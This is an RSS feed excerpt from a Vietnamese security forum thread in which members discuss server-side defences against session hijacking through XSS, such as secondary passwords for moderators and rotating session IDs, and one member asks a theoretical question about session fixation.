			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ theo mình nghĩ trường hợp nạn nhân bị session hijacking có high privileges như mods... thì việc bị thiệt hại thì ko thể tránh khỏi, nhưng cũng ko thể giảm thời gian valid của cookie vì càng giảm sẽ phá vỡ functionality và tính... dễ ứng dụng, ko user nào muốn cứ mỗi lần coi xong 2,3 topics thì lại nhập pass vào lại...
c p
mình nghĩ tới cách sau : (ko biết có trùng ko vì chưa đọc hết mấy trang trước :P)
--- giữ nguyên ttl session, chỉ tạo thêm pass 2,3 ... cho những nhân vật quan trọng, có 1 table cho các action modify, delete, move, rename topics, posts.... cho mod, ko thực thực thi các action đó ngay lập tức mà store vào table, sau mỗi 5 actions, nếu mod muốn thực hiện 1 action kế tiếp thì phải pass authentication bằng pass 2 (mod cũng luôn có thể thực hiện action ngay lập tức và cũng phải thông qua pass2)

--- cùng 1 acc online 2 bên online cùng lúc sẽ set cookie invalid cả 2 và bị out hết 

như vậy dù cookie "ra đi", attacker cũng ko thực hiện được gì gây tổn hại nghiêm trọng


nhược điểm của cách này là khó ứng dụng, thời gian time out session giới hạn làm cho vd  nhiều khi mod có 5 action thì time out, và phải làm lại từ đầu (giảm tối thiểu bằng cách giảm xuống buộc phải xác thực sau 3 actions.... )

lâu lắm rồi mới vào hva, ko biết thời gian valid của cookie là bao lâu :) nhưng dĩ nhiên nâng cao security của appl luôn phá vỡ functionality và ease of use, và vì 1 trong 3 cái đó phải hy sinh những cái còn lại, vì vậy cần phải xem xét coi sự hy sinh có đáng ko

bản thân thì mình cách xác thực nghĩ của mình cũng "hơi hơi" ko đáng lắm  :(  :( , khó thực thi,  thiếu tính ứng dụng ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#120516</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#120516</link>
				<pubDate><![CDATA[Fri, 21 Mar 2008 18:27:14]]> GMT</pubDate>
				<author><![CDATA[ virtual_acc]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Mình nghĩ cách dùng password thứ hai khá hay. VD ta cho nó gồm 2 chữ số và trong mỗi tao tác quản trị thì verify lại pass này. Vì pass phụ chỉ có 2 chữ số nên ko gây nhiều quá nhiều cản trở như việc nhập lại pass chính (passwd của các admin và mod trên forum thì có lẽ khá rắc rối). ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#121067</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#121067</link>
				<pubDate><![CDATA[Mon, 24 Mar 2008 22:15:31]]> GMT</pubDate>
				<author><![CDATA[ nhuhoang]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">nhuhoang wrote:</cite><br>
		<blockquote>Mình nghĩ cách dùng password thứ hai khá hay. VD ta cho nó gồm 2 chữ số và trong mỗi tao tác quản trị thì verify lại pass này. Vì pass phụ chỉ có 2 chữ số nên ko gây nhiều quá nhiều cản trở như việc nhập lại pass chính (passwd của các admin và mod trên forum thì có lẽ khá rắc rối). &nbsp;
		</blockquote>
thực ra chỉ cần 1 password là đủ bạn ạ, vì kẻ tấn công chỉ lấy được sessionID +http header chứ không lấy được password của người bị hại.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#121088</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#121088</link>
				<pubDate><![CDATA[Tue, 25 Mar 2008 00:48:33]]> GMT</pubDate>
				<author><![CDATA[ secmask]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ hi,

biết là cái thread này cũng lâu rồi, nhưng tự nhiên hôm nay sực nhớ ra khi làm việc với Cookie. Boom_jt thử nói 1 biện pháp từ phía server nhé, cũng cần 1 chút trợ giúp trong cái implementation việc lưu cookie ở phía client:

Server thường xuyên "làm mới" sessionid và gửi về client trong response của mỗi request, thông qua trường Set-cookie trong HTTP headers.

Client khi nhận đc 1 response có trường Set-cookie trong header thì lưu cookie mới vào 1 biến tạm thời, chứ chưa set luôn cookie 1 cách "chính thức". Client chỉ set cookie chính thức ngay trước khi request tiếp theo được thực hiện (và / hoặc ngay trước khi user đóng trình duyệt).

Khi đó, dù kẻ tấn công có thực hiện session hijacking thì cũng chỉ lấy được sessionid cũ mà thôi, không còn tác dụng gì cả.

lưu ý thêm chút là việc lưu cookie tại client là mình muốn nói đến implementation của trình duyệt, chứ không phải là 1 cái script chạy ở client nhé.

Mong tiếp tục thảo luận :)]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#141954</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#141954</link>
				<pubDate><![CDATA[Thu, 17 Jul 2008 01:44:05]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ em có câu này hỏi mong các anh chỉ giáo : 
đây là kỹ thuật tấn công ấn định phiên làm việc ạ (ấn định sessionID)
1.kẻ tấn công truy nhập vào abc.com và abc.com sẽ cấp cho kẻ tấn công 1 sessionID
2.kẻ tấn công lừa người nhẹ dạ login vào đường link trên(đã có sessionID)
3.như vậy đối với abc.com thì cả kẻ tấn công và bị tấn công đều hợp lệ.

Tóm lại em muốn hỏi là làm cách nào mà kẻ tấn công biết người dùng đăng nhập lúc nào và nếu người dùg đăng nhập thành công thì do có cùng 1 sessionID thì có chắc chắn là kẻ tấn công sẽ vượt qua phần đăng nhập dù kô biết user và pass.

Câu hỏi chỉ mang tính lý thuyết ạ,các anh trả lời hộ em với ạ.

]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#160534</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#160534</link>
				<pubDate><![CDATA[Thu, 27 Nov 2008 20:19:06]]> GMT</pubDate>
				<author><![CDATA[ hunter1b]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ í em còn quên cái này,các anh chỉ dùm em luôn,em thấy các anh bảo là chỉ cần view sorce là có thể thấy được sessionID mà em tìm mãi mà kô thấy cái sesionID nào cả,thử mấy trang rồi.mong chỉ giúp ạ.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#160535</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#160535</link>
				<pubDate><![CDATA[Thu, 27 Nov 2008 20:24:07]]> GMT</pubDate>
				<author><![CDATA[ hunter1b]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">hunter1b wrote:</cite><br>
		<blockquote>í em còn quên cái này,các anh chỉ dùm em luôn,em thấy các anh bảo là chỉ cần view sorce là có thể thấy được sessionID mà em tìm mãi mà kô thấy cái sesionID nào cả,thử mấy trang rồi.mong chỉ giúp ạ.&nbsp;
		</blockquote>

Ai bảo view source là thấy được sessionID thế?]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#160583</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#160583</link>
				<pubDate><![CDATA[Fri, 28 Nov 2008 08:52:42]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>[Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ Một chủ đề hay vậy mà dừng ngang rồi Hix ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#232291</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#232291</link>
				<pubDate><![CDATA[Wed, 2 Mar 2011 05:35:00]]> GMT</pubDate>
				<author><![CDATA[ ACE_AnGeL]]></author>
			</item>
	</channel>
</rss>
